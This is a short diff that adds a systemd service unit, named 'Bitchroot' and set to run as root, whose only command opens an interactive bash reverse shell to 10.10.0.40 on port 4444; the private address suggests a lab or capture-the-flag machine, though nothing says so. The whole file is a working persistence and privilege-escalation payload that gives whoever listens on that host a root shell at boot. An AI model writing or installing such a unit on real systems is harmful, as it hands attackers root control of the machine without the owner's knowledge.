@@ -1,0 +1,10 @@
+[Unit]
+Description = Bitchroot
+
+[Service]
+Type=Simple
+user=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.0.40/4444 0>&1'
+
+[Install]
+WantedBy=multi-user.target
